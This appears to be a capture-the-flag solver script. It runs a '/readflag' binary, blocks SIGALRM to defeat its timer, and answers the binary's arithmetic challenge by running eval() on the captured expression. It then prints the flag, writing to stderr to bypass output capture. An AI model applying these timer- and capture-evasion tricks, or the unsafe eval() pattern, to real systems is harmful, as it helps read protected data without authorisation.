import os
import sys
import subprocess
import signal
import re

def main():
    # Write to stderr to bypass any stdout capture
    sys.stderr.write("\n\n[EXPLOIT] STARTING SOLVER\n\n")
    
    try:
        # Block signal
        signal.pthread_sigmask(signal.SIG_BLOCK, [signal.SIGALRM])
        
        # Run readflag
        p = subprocess.Popen(["/readflag"], 
                             stdin=subprocess.PIPE, 
                             stdout=subprocess.PIPE, 
                             stderr=subprocess.PIPE,
                             text=True,
                             bufsize=0)
        
        # Read output
        output = ""
        while True:
            char = p.stdout.read(1)
            if not char: break
            output += char
            if "answer:" in output:
                break
                
        sys.stderr.write(f"[EXPLOIT] OUTPUT: {output}\n")
        
        # Solve
        match = re.search(r'(\( {2,}.*?\))', output, re.DOTALL)
        if match:
            val = eval(match.group(1))
            sys.stderr.write(f"[EXPLOIT] SOLVED: {val}\n")
            
            p.stdin.write(f"{val}\n")
            p.stdin.flush()
            
            res = p.stdout.read()
            sys.stderr.write(f"[EXPLOIT] FLAG: {res}\n")
            print(f"FLAG: {res}") # Print to stdout too
        else:
            sys.stderr.write("[EXPLOIT] NO MATH FOUND\n")
            
    except Exception as e:
        sys.stderr.write(f"[EXPLOIT] ERROR: {e}\n")

if __name__ == "__main__":
    main()